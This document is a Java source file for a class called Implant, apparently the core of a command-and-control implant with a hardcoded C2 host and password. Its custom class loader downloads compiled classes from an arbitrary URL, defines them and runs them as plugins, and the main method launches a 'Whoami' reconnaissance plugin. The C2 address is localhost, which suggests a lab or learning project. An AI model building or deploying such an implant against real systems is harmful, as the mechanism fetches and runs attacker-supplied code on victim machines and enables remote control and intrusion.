import java.net.URL;
import java.net.URLConnection;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;
import java.net.MalformedURLException;
import java.io.IOException;

public class Implant extends ClassLoader {

    private String c2Host = "http://localhost:3000";
    private String c2password = "secret_password";
    
    public Implant(ClassLoader parent) {
	super(parent);
    }

    public Class loadClass(String name, String pluginUrl) throws ClassNotFoundException {
        try {
            String url = pluginUrl;
            URL myUrl = new URL(url);
            URLConnection connection = myUrl.openConnection();
            InputStream input = connection.getInputStream();
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            int data = input.read();

            while(data != -1){
                buffer.write(data);
                data = input.read();
            }

            input.close();

            byte[] classData = buffer.toByteArray();

            return defineClass(name,
                    classData, 0, classData.length);

        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        return null;
    }
    
    public void loadPlugin(String pluginName, String path, Implant classLoader) throws ClassNotFoundException, InstantiationException, IllegalAccessException {
	Class myObjectClass = classLoader.loadClass(pluginName, path);
	
	PluginI plugin = (PluginI) myObjectClass.newInstance();
	plugin.RunIt();
    }
    
    public static void main(String[] args) {
	try {
	    System.out.println("Loading from: "+System.getenv("PWD"));
	    ClassLoader parentClassLoader = Implant.class.getClassLoader();
	    Implant classLoader = new Implant(parentClassLoader);
	    classLoader.loadPlugin("Whoami", "file://"+System.getenv("PWD")+"/../plugins/Whoami.class", classLoader);
	} catch (ClassNotFoundException cnf) {
	} catch (InstantiationException ie) {
	} catch (IllegalAccessException iae) {
	}
    }
}
